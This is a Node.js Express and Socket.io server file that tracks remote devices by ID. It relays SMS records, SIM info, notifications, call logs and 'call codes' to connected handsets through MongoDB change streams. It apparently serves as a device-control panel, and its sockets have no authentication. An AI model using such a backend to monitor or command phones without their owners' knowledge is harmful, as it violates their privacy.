import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// =============================================
// 🔥 DEVICE SOCKET STORAGE (uniqueid Based)
// =============================================
const deviceSockets = new Map();  // uniqueid → socketId
const watchers = new Map();       // uniqueid → Set(socketId)

// =============================================
// 🔥 Notify Device Details Page
// =============================================
function notifyWatchers(uniqueid, payload) {
  const w = watchers.get(uniqueid);
  if (!w) return;
  for (let sid of w) io.to(sid).emit("deviceStatusSingle", payload);
}

// =============================================
// 🔥 SOCKET SYSTEM
// =============================================
io.on("connection", (socket) => {
  console.log("🟢 New Socket Connected:", socket.id);

  let currentUniqueId = null;

  // ---------------------------------------------
  // 👁 Watch Single Device Page
  // ---------------------------------------------
  socket.on("watchDevice", (uniqueid) => {
    if (!uniqueid) return;

    if (!watchers.has(uniqueid)) watchers.set(uniqueid, new Set());
    watchers.get(uniqueid).add(socket.id);

    console.log(`👁 Watching Device → ${uniqueid}`);
  });

  socket.on("unwatchDevice", (uniqueid) => {
    if (watchers.has(uniqueid)) watchers.get(uniqueid).delete(socket.id);
  });

  // ---------------------------------------------
  // 📌 REGISTER DEVICE
  // ---------------------------------------------
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    console.log("🔗 REGISTER DEVICE:", uniqueid);

    deviceSockets.set(uniqueid, socket.id);

    currentUniqueId = uniqueid;
    socket.join(uniqueid);

    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });

    notifyWatchers(uniqueid, {
      uniqueid,
      connectivity: "Online",
      updatedAt: new Date(),
    });
  });

  // ---------------------------------------------
  // 🔵 DEVICE STATUS
  // ---------------------------------------------
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ STATUS: ${uniqueid} → ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    const payload = {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    };

    io.emit("deviceStatus", payload);
    notifyWatchers(uniqueid, payload);
  });

  // ---------------------------------------------
  // 🔴 DISCONNECT
  // ---------------------------------------------
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentUniqueId) {
      const latest = deviceSockets.get(currentUniqueId);

      if (latest === socket.id) {
        console.log("🛑 DEVICE OFFLINE:", currentUniqueId);

        deviceSockets.delete(currentUniqueId);
        saveLastSeen(currentUniqueId, "Offline");

        const payload = {
          uniqueid: currentUniqueId,
          connectivity: "Offline",
          updatedAt: new Date(),
        };

        io.emit("deviceStatus", payload);
        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          uniqueid: currentUniqueId,
        });

        notifyWatchers(currentUniqueId, payload);
      }
    }

    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// =============================================
// 🔥 Save Last Seen
// =============================================
async function saveLastSeen(uniqueid, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message);
  }
}

// =============================================
// 🔥 SEND CALL CODE
// =============================================
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`📞 CallCode Sent → ${uniqueid}`);
  }
}

// =============================================
// 🛡️ MONGO CONNECTION ERROR LOG (SAFETY)
// =============================================
mongoose.connection.on("error", (err) => {
  console.error("❌ MongoDB connection error:", err.message);
});

// =============================================
// 🔥 MONGO STREAMS (WITH ERROR HANDLING + RETRY)
// =============================================
mongoose.connection.once("open", () => {
  console.log("📡 Mongo Streams Active...");

  const watchWithRetry = (collection, eventName, callback, delay = 5000) => {
    const startWatch = () => {
      try {
        const stream = mongoose
          .connection
          .collection(collection)
          .watch();

        console.log(`👀 Watching collection: ${collection}`);

        // On change
        stream.on("change", async (change) => {
          try {
            if (!["insert", "update", "replace"].includes(change.operationType)) {
              return;
            }

            const updated = await mongoose
              .connection
              .collection(collection)
              .findOne({ _id: change.documentKey._id });

            if (updated) callback(updated);
          } catch (err) {
            console.error(`❌ Error processing change on ${collection}:`, err.message);
          }
        });

        // 💣 IMPORTANT: HANDLE ERRORS SO APP DOESN'T CRASH
        stream.on("error", (err) => {
          console.error(`🔥 ChangeStream error on ${collection}:`, err.message);
          try {
            stream.close();
          } catch (_) {}

          // ⏱️ Retry after small delay
          setTimeout(() => {
            console.log(`🔁 Restarting watch on collection: ${collection}`);
            watchWithRetry(collection, eventName, callback, delay);
          }, delay);
        });

        // Optional: handle close event (for logs)
        stream.on("close", () => {
          console.warn(`⚠️ ChangeStream closed for collection: ${collection}`);
        });
      } catch (err) {
        console.error(`❌ Failed to start watch on ${collection}:`, err.message);
        // Retry later
        setTimeout(() => {
          console.log(`🔁 Retrying watch init on: ${collection}`);
          startWatch();
        }, delay);
      }
    };

    startWatch();
  };

  // DEVICE STREAM
  watchWithRetry("devices", "deviceListUpdated", (data) => {
    io.emit("deviceListUpdated", { event: "db_change", device: data });
  });

  // SIM STREAM
  watchWithRetry("siminfos", "simInfoUpdated", (data) => {
    io.emit("simInfoUpdated", { event: "sim_change", sim: data });
  });

  // CALL STREAM (uses uniqueid)
  watchWithRetry("callcodes", "callCodeUpdate", (data) => {
    if (!data.uniqueid) return;
    sendCallCodeToDevice(data.uniqueid, data);
  });

  // SMS STREAM (uses uniqueid)
  watchWithRetry("sms", "smsUpdate", (data) => {
    if (!data.uniqueid) return;
    const sock = deviceSockets.get(data.uniqueid);
    if (sock) io.to(sock).emit("smsUpdate", data);
  });
});

// =============================================
// ROUTES
// =============================================
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

app.get("/", (req, res) =>
  res.send("🔥 Stable Socket Backend Running (uniqueid Mode)")
);

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running at http://localhost:${PORT}`)
);
